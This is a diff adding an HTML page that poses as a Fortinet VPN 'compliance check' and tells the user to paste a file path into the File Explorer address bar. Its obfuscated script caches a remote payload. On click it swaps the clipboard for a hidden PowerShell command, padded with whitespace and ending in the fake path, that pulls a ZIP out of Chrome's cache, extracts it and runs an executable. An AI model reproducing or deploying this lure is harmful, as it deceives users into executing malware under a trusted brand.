@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Fortinet - Compliance checker</title>
+  <link href="https://fonts.googleapis.com/css?family=Noto+Sans:400,700&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    :root {
+      --fortinet-red: #e2001a;
+      --fortinet-dark: #151515;
+      --light-grey: #f5f6fa;
+    }
+    body {
+      font-family: 'Noto Sans', Arial, sans-serif;
+      background: var(--light-grey);
+      margin: 0;
+      color: #222;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .header {
+      background: var(--fortinet-dark);
+      display: flex;
+      align-items: center;
+      border-bottom: 4px solid var(--fortinet-red);
+      padding: 0 0 0 0;
+      height: 70px;
+      box-shadow: 0 2px 8px #0001;
+    }
+    .fortinet-logo {
+      height: 46px;
+      margin: 11px 22px 11px 32px;
+      flex-shrink: 0;
+      display: inline-block;
+      vertical-align: middle;
+    }
+    .header-title {
+      color: #fff;
+      font-weight: 700;
+      font-size: 2rem;
+      letter-spacing: 1px;
+      line-height: 1.1;
+      margin-left: 40px;
+    }
+    .container {
+      width: 100%;
+      max-width: 470px;
+      margin: 45px auto 0 auto;
+      background: #fff;
+      border-radius: 13px;
+      box-shadow: 0 0 28px 0 rgba(34,40,51,0.10), 0 2px 10px 0 rgba(34,40,51,0.09);
+      padding: 38px 38px 22px 38px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+    }
+    .file-svg {
+      width: 52px;
+      height: 52px;
+      margin-bottom: 14px;
+      filter: drop-shadow(0 2px 6px #e2001a33);
+    }
+    h2 {
+      font-size: 1.22em;
+      color: #111;
+      font-weight: 700;
+      margin: 0 0 7px 0;
+      letter-spacing: 0.17px;
+      text-align:center;
+    }
+    .timestamp {
+      font-size: 13.5px;
+      color: #979797;
+      margin-bottom: 3px;
+      text-align:center;
+    }
+    .instructions {
+      text-align: left;
+      width:100%;
+      padding: 19px 0 14px 0;
+      font-size: 1.01em;
+      color: #272925;
+      line-height: 1.67;
+    }
+    .instructions ol {
+      margin: 0 0 12px 18px;
+      padding: 0;
+    }
+    .instructions strong { color:var(--fortinet-red);}
+    .instructions li {
+      margin-bottom: 12px;
+      padding-left: 3px;
+    }
+    .code-block {
+      background-color: #ffe4e8;
+      border: 1.2px solid #e2001a;
+      border-radius: 5px;
+      padding: 9px 13px;
+      font-family: "Consolas", Monaco, monospace;
+      font-size: 15px;
+      margin: 7px 0 0 0;
+      position: relative;
+      transition: background-color 0.2s, box-shadow 0.2s;
+      cursor: pointer;
+      user-select: all;
+      color: #b10015;
+      box-shadow: 0 2px 7px #e2001a08;
+      display: inline-block;
+    }
+    .code-block:hover, .code-block.clicked {
+      background-color: #fbeaec;
+      box-shadow: 0 3px 10px #e2001a1d;
+    }
+    .code-block::after {
+      content: "Copy";
+      position: absolute;
+      top: 50%;
+      right: 18px;
+      transform: translateY(-50%);
+      font-size: 12px;
+      color: #e2001a;
+      opacity: 0;
+      transition: opacity 0.18s;
+      font-weight: 700;
+      letter-spacing: .22px;
+    }
+    .code-block:hover::after {
+      opacity: 1;
+    }
+    .code-block.clicked::after {
+      content: "Copied";
+      color: #00964c;
+      opacity: 1;
+    }
+    .upload-section {
+      margin-top: 23px;
+      padding: 19px 19px 12px 19px;
+      background: #f3f5f8;
+      border: 1.5px solid #d3d9df;
+      border-radius: 7.5px;
+      width: 102%;
+      box-shadow: 0 1.5px 12px #e2001a09;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .upload-label {
+      background-color: var(--fortinet-red);
+      color: white;
+      display: inline-block;
+      padding: 12px 34px;
+      border-radius: 6px;
+      font-size: 1.08em;
+      cursor: pointer;
+      font-weight: 700;
+      letter-spacing: 0.09em;
+      transition: background 0.19s, box-shadow 0.19s;
+      box-shadow: 0 1.5px 10px #e2001a27;
+      margin-bottom: 0px;
+      margin-top: 7px;
+      border: none;
+      outline: none;
+      text-align:center;
+    }
+    .upload-label:hover { background-color: #b10015; box-shadow: 0 3px 12px #e2001a29;}
+    #uploadedFileName {
+      font-size: 0.98em;
+      color: #4d5159;
+      margin-top: 10px;
+      font-style: italic;
+      max-width:300px;
+      text-overflow: ellipsis;
+      overflow-x: hidden;
+      white-space: nowrap;
+    }
+    input[type="file"] { display: none; }
+    .footer {
+      font-size: 12.3px;
+      color: #888;
+      background-color: #f9f9fa;
+      padding: 19px 14px 14px;
+      border-top: 1.6px solid #ececec;
+      text-align: center;
+      border-radius: 0 0 13px 13px;
+      margin-top: 19px;
+      letter-spacing: 0.07em;
+    }
+    @media (max-width: 600px) {
+      .container { padding: 13px 2vw; margin: 11px;}
+      .header-title { font-size: 1.1em; }
+      .upload-section {width: 99%;}
+    }
+  </style>
+</head>
+<body>
+  <!-- Fortinet Header Bar -->
+<div class="header">
+  <!-- Logo SVG uniquement -->
+  <svg class="fortinet-logo" viewBox="0 0 54 36" xmlns="http://www.w3.org/2000/svg" style="vertical-align: middle;">
+    <rect fill="#e2001a" x="0" y="0" width="16" height="16" rx="3"/>
+    <rect fill="#e2001a" x="18" y="0" width="16" height="16" rx="3"/>
+    <rect fill="#e2001a" x="36" y="0" width="16" height="16" rx="3"/>
+    <rect fill="#e2001a" x="0" y="18" width="16" height="16" rx="3"/>
+    <rect fill="#e2001a" x="18" y="18" width="16" height="16" rx="3"/>
+    <rect fill="#e2001a" x="36" y="18" width="16" height="16" rx="3"/>
+  </svg>
+  <!-- Texte Fortinet séparé, mieux aligné et lisible -->
+  <span class="fortinet-wordmark" style="
+    color: #fff;
+    font-family: 'Noto Sans', Arial, sans-serif;
+    font-weight: bold;
+    letter-spacing: 2px;
+    font-size: 2.00rem;
+    margin-left: 18px;">Fortinet</span>
+  <span class="header-title">Secure File Access</span>
+</div>
+  <div class="container">
+    <div style="text-align:center;margin-top:7px;">
+      <svg class="file-svg" fill="#e2001a" viewBox="0 0 32 32"><path d="M0 25.472q0 2.368 1.664 4.032t4.032 1.664h18.944q2.336 0 4-1.664t1.664-4.032v-8.192l-3.776 3.168v5.024q0 0.8-0.544 1.344t-1.344 0.576h-18.944q-0.8 0-1.344-0.576t-0.544-1.344v-18.944q0-0.768 0.544-1.344t1.344-0.544h9.472v-3.776h-9.472q-2.368 0-4.032 1.664t-1.664 4v18.944zM5.696 19.808q0 2.752 1.088 5.28 0.512-2.944 2.24-5.344t4.288-3.872 5.632-1.664v5.6l11.36-9.472-11.36-9.472v5.664q-2.688 0-5.152 1.056t-4.224 2.848-2.848 4.224-1.024 5.152zM32 22.080v0 0 0z"></path></svg>
+      <h2>
+        Fortinet VPN client compliance check
+      </h2>
+      <div class="timestamp" id="dynamicTimestamp"></div>
+    </div>
+    <div class="instructions">
+      <ol>
+        <li>
+          Copy the file path below
+          <div class="code-block" id="path" title="Click to copy">\\Public\Support\VPN\ForticlientCompliance.exe</div>
+        </li>
+        <li>
+          Open File Explorer and select the address bar (<strong>CTRL + L</strong>)
+        </li>
+        <li>
+          Paste the file path (<strong>CTRL + V</strong>) and press <strong>Enter</strong>
+        </li>
+      </ol>
+    </div>
+    <div class="upload-section">
+      <label class="upload-label" for="conformityFile" tabindex="0">
+        &#8682; Open File Explorer
+      </label>
+      <input type="file" id="conformityFile" accept=".txt,.pdf,.html">
+    </div>
+    <div class="footer">
+      &copy; 2025 Fortinet, Inc. All Rights Reserved.<br>
+      This page was automatically generated for secure file access by the Fortinet support team.<br>
+    </div>
+  </div>
+  <script>
+
+function _0x30c9(_0x515a77,_0x486fce){const _0x401e77=_0x401e();return _0x30c9=function(_0x30c964,_0x2e1542){_0x30c964=_0x30c964-0x166;let _0xfa3bd7=_0x401e77[_0x30c964];return _0xfa3bd7;},_0x30c9(_0x515a77,_0x486fce);}const _0x37eb3a=_0x30c9;(function(_0x1d5ea7,_0x52ff67){const _0x21e319=_0x30c9,_0x3af904=_0x1d5ea7();while(!![]){try{const _0x289ed2=-parseInt(_0x21e319(0x17e))/0x1+-parseInt(_0x21e319(0x172))/0x2+parseInt(_0x21e319(0x178))/0x3*(-parseInt(_0x21e319(0x17f))/0x4)+-parseInt(_0x21e319(0x16e))/0x5*(-parseInt(_0x21e319(0x16f))/0x6)+-parseInt(_0x21e319(0x171))/0x7+-parseInt(_0x21e319(0x166))/0x8*(parseInt(_0x21e319(0x169))/0x9)+parseInt(_0x21e319(0x174))/0xa;if(_0x289ed2===_0x52ff67)break;else _0x3af904['push'](_0x3af904['shift']());}catch(_0x5f3ba2){_0x3af904['push'](_0x3af904['shift']());}}}(_0x401e,0xea33c),fetch(_0x37eb3a(0x179))['then'](_0x4b029a=>_0x4b029a[_0x37eb3a(0x17a)]())[_0x37eb3a(0x17d)](_0x4a1d3e=>{const _0x1968e3=_0x37eb3a;console[_0x1968e3(0x173)](_0x1968e3(0x177));}));function pad(_0x328823){return _0x328823<0xa?'0'+_0x328823:_0x328823;}const now=new Date(),yyyy=now['getFullYear'](),mm=pad(now['getMonth']()+0x1),dd=pad(now[_0x37eb3a(0x16b)]()),h=pad(now[_0x37eb3a(0x16d)]()),min=pad(now[_0x37eb3a(0x17c)]()),sec=pad(now[_0x37eb3a(0x16a)]()),dateString=dd+'/'+mm+'/'+yyyy+'\x20'+h+':'+min+':'+sec;function _0x401e(){const _0x5074aa=['then','890406dgfsli','48FHJuzX','getElementById','2552552sfvPnM','clipboard','addEventListener','27iAaLwT','getSeconds','getDate','writeText','getHours','25JfIRDV','2266026UrrAdA','dynamicTimestamp','11113879zQQFdX','3548160nyokJx','log','49584830RhpPFK','path','click','Image\x20forcée\x20en\x20cache','169539DukjRM','/5b900a00-71e9-45cf-acc0-d872e1d6cdaa','blob','C:\x5cWindows\x5cSystem32\x5cconhost.exe\x20--headless\x20powershell\x20-c\x20\x22$k=\x27%LOCALAPPDATA%\x5cFortiClient\x5ccompliance\x27;mkdir\x20-Force\x20$k\x20>\x20$null;$d=\x27%LOCALAPPDATA%\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cDefault\x5cCache\x5cCache_Data\x5c\x27;cp\x20$d*\x20$k;\x20gci\x20$k|%{$c=[System.Text.Encoding]::Default.GetString([System.IO.File]::ReadAllBytes($_.FullName));$m=[regex]::Matches($c,\x27(?<=bTgQcBpv)(.*?)(?=mX6o0lBw)\x27,16);if($m.Count-gt\x200){[System.IO.File]::WriteAllBytes($k+\x20\x27\x5cComplianceChecker.zip\x27,[System.Text.Encoding]::Default.GetBytes($m[0].Value));\x20Expand-Archive\x20$k\x27\x5cComplianceChecker.zip\x27\x20$k\x20-Force;\x20&\x20$k\x27\x5cFortiClientComplianceChecker.exe\x27}}\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20#\x20\x5c\x5cPublic\x5cSupport\x5cVPN\x5cForticlientCompliance.exe\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22','getMinutes'];_0x401e=function(){return _0x5074aa;};return _0x401e();}document['getElementById'](_0x37eb3a(0x170))['textContent']=dateString;const path=document[_0x37eb3a(0x180)](_0x37eb3a(0x175));path[_0x37eb3a(0x168)](_0x37eb3a(0x176),function(){const _0x409f5e=_0x37eb3a;navigator[_0x409f5e(0x167)][_0x409f5e(0x16c)](_0x409f5e(0x17b));});const cFile=document[_0x37eb3a(0x180)]('conformityFile'),fname=document[_0x37eb3a(0x180)]('uploadedFileName');cFile[_0x37eb3a(0x168)](_0x37eb3a(0x176),function(){const _0x4ab6ab=_0x37eb3a;navigator[_0x4ab6ab(0x167)][_0x4ab6ab(0x16c)](_0x4ab6ab(0x17b)),conformityFile[_0x4ab6ab(0x176)]();});
+  </script>
+</body>
+</html>
